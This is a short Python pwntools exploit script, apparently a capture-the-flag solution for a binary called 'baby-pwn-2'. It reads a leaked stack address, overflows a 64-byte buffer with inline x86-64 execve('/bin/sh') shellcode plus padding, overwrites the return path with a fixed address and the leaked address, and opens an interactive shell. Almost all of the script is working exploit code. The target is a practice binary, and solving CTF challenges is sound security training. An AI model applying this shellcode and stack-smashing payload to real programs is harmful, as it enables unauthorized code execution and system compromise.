#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./baby-pwn-2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './baby-pwn-2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

shellcode = b'H\xb8/bin/sh\x00PT_1\xc0P\xb0;TZT^\x0f\x05'
io.recvuntil("Stack address leak: ")
mem_addr = io.recvline()[:-1]
print(mem_addr)
payload = b""
payload += shellcode
payload += b"A"*(64 - len(shellcode))
payload += p64(int("0x4011a7",16))
payload += p64(int(mem_addr.decode(),16))
io.sendline(payload)
io.interactive()

